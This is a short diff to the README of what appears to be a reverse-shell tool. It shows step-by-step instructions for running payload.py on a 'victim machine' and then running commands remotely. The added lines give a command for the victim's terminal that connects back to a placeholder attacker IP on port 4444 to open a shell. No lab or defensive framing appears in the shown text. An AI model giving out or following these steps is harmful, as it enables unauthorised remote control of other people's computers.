@@ -35,10 +35,10 @@ step 4. execute the payload.py on the victim machine
 step 5. You should get something like this:
   <img width="448" height="45" alt="Captura de pantalla 2026-05-06 100354" src="https://github.com/user-attachments/assets/ac5c61d8-ea1e-4e50-8a79-956a0e555ff5" />
 
-step 6. Okay, now you can run commands!
-
-### Remember to replace this part of the payload.py with the attacker IP address.
-<img width="182" height="34" alt="image" src="https://github.com/user-attachments/assets/d5316c91-e7fb-4134-991c-b59f4f5ff684" />
+step 6. On the victim's terminal, execute:
+```bash
+python payload.py --ip [ATTACKER IP] --port [PORT] (default 4444)
+``` 
 
 
 
